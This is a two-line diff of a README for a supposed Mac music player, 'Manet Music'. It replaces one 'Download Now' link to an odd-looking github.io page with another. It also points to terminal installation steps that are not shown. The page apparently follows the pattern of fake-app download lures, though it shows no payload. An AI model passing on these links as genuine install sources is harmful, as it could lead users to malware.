@@ -2,7 +2,7 @@
 
 Manet Music is a sleek, user-friendly music player designed for Mac OS, offering seamless audio playback and library management. Follow the instructions below to install it effortlessly on your device.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/manetmusic) 
+[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/manetmusic) 
 
 If the download button doesn't work, follow the terminal installation instructions below.
 
